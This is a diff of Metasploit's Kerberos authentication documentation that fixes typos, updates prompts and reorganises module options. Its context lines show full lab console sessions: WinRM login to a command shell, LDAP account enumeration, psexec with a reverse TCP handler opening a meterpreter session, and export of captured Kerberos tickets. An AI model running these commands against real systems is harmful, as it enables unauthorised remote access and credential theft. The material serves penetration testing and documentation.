@@ -2,7 +2,7 @@
 
 Since version 6.3, Metasploit has included authentication via Kerberos for multiple types of modules. Kerberos
 authentication allows Metasploit users to request and utilize Ticket Granting Tickets (TGTs) and Ticket Granting
-Services (TGSs) to authenticate with supported modules. Metasploit uses an internal caching and storage machanism but
+Services (TGSs) to authenticate with supported modules. Metasploit uses an internal caching and storage mechanism but
 tickets are stored able to be both exported and imported from [MIT Credential Cache][1] (CCACHE) files. A converter for
 Kirbi to and from CCACHE files is also available in the `auxiliary/admin/kerberos/ticket_converter` module.
 
@@ -18,8 +18,8 @@ Metasploit currently offers Kerberos authentication for the following services -
 Open a WinRM session:
 
 ```msf
-msf6 > use auxiliary/scanner/winrm/winrm_login
-msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local
+msf > use auxiliary/scanner/winrm/winrm_login
+msf auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local
 
 [+] 192.168.123.13:88 - Received a valid TGT-Response
 [*] 192.168.123.13:5985   - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_451736.bin
@@ -31,7 +31,7 @@ msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Ad
 [*] Command shell session 1 opened (192.168.123.1:50722 -> 192.168.123.13:5985) at 2023-01-18 12:06:05 +0000
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/winrm/winrm_login) > sessions -i -1
+msf auxiliary(scanner/winrm/winrm_login) > sessions -i -1
 [*] Starting interaction with 1...
 
 Microsoft Windows [Version 10.0.14393]
@@ -43,8 +43,8 @@ C:\Users\Administrator>
 Query LDAP for accounts:
 
 ```msf
-msf6 > use auxiliary/gather/ldap_query
-msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
+msf > use auxiliary/gather/ldap_query
+msf auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
 [*] Running module against 192.168.123.13
 
 [+] 192.168.123.13:88 - Received a valid TGT-Response
@@ -79,8 +79,8 @@ CN=Administrator CN=Users DC=adf3 DC=local
 Running psexec against a host:
 
 ```msf
-msf6 > use exploit/windows/smb/psexec
-msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
+msf > use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 192.168.123.13:445 - Connecting to the server...
@@ -102,8 +102,8 @@ meterpreter >
 Connect to a Microsoft SQL Server instance and run a query:
 
 ```msf
-msf6 > use auxiliary/admin/mssql/mssql_sql
-msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
+msf > use auxiliary/admin/mssql/mssql_sql
+msf auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
 [*] Reloading module...
 [*] Running module against 192.168.123.13
 
@@ -130,17 +130,20 @@ Required options:
 * `${Prefix}::Rhostname` -- The hostname of the target system. This value should be either the hostname `WIN-MIJZ318SQH` or
   the FQDN like `WIN-MIJZ318SQH.msflab.local`. i.e. `Smb::Rhostname=WIN-MIJZ318SQH.msflab.local`
 * `${Prefix}Domain` -- The domain name of the target system, e.g. `msflab.local`. i.e. `SmbDomain=msflab.local`
-* `DomainControllerRhost` -- The IP address of the domain controller to use for kerberos authentication. i.e. `DomainControllerRhost=192.168.123.13`
 
 Optional options:
+* `DomainControllerRhost` -- The IP address or hostname of the domain controller to use for Kerberos authentication.
+  i.e. `DomainControllerRhost=192.168.123.13`. If this value is not specified, Metasploit will look it up via the
+  realm's (the `${Prefix}Domain` option) SRV record in DNS.
 * `${Prefix}::Krb5Ccname` -- The path to a CCACHE file to use for authentication. This is comparable to setting the
-  `KRB5CCNAME` environment variable for other tools. If specified, the tickets it contains will be used. i.e. `KRB5CCNAME=/path/to/Administrator.ccache`
+  `KRB5CCNAME` environment variable for other tools. If specified, the tickets it contains will be used. i.e. `KRB5CCNAME=/path/to/Administrator.ccache`.
 * `KrbCacheMode` -- The cache storage mode to use, one of the following four options:
     * `none` -- No cache storage is used, new tickets are requested and no tickets are stored.
     * `read-only` -- Stored tickets from the cache will be used, but no new tickets are stored.
     * `write-only` -- New tickets are requested and they are stored for reuse.
     * `read-write` -- Stored tickets from the cache will be used and new tickets will be stored for reuse.
-* `${Prefix}KrbOfferedEncryptionTypes' -- The list of encryption types presented to the KDC as being supported by the Metasploit client. i.e. `SmbKrbOfferedEncryptionTypes=AES256`
+* `KrbClockSkew` -- Adjust Kerberos timestamps by the given offset when talking to the KDC. Supports `s`, `m`, `h`, and `d` units and accepts negatives, e.g. `-5m` or `120s`.
+* `${Prefix}KrbOfferedEncryptionTypes` -- The list of encryption types presented to the KDC as being supported by the Metasploit client. i.e. `SmbKrbOfferedEncryptionTypes=AES256`
 
 ## Ticket management
 
@@ -148,7 +151,7 @@ When a write-enabled `KrbCacheMode` is used, tickets that are issued to Metasplo
 command can be used to view tickets. It is a top level command and can be run even if a module is in use.
 
 ```msf
-msf6 > klist
+msf > klist
 Kerberos Cache
 ==============
 host            principal               sname                              issued                     status       path
@@ -165,7 +168,7 @@ host            principal               sname                              issue
 More detailed information can be displayed by using the verbose (`-v` / `--verbose`) option.
 
 ```msf
-msf6 > klist -v
+msf > klist -v
 Kerberos Cache
 ==============
 Cache[0]:
@@ -234,7 +237,7 @@ CCACHE files can be viewed with the `loot --type mit.kerberos.ccache` command (t
 specified type).
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache
+msf auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache
 
 Loot
 ====
@@ -268,7 +271,7 @@ Simultaneous Users: 16777216
 
 ## Using external tickets with Metasploit
 A ticket obtained outside of Metasploit can be used for authentication by setting the `${Prefix}::Krb5Ccname` option
-which is prioritized over the cache. This file must be in the [MIT Credential Cache][1] (CCACHE) file formath. If the
+which is prioritized over the cache. This file must be in the [MIT Credential Cache][1] (CCACHE) file format. If the
 ticket is in the Kirbi format, it must first be converted using the `auxiliary/admin/kerberos/ticket_converter` module.
 
 When an explicit CCACHE file is specified to load a ticket from, Metasploit will first attempt to load a TGS ticket
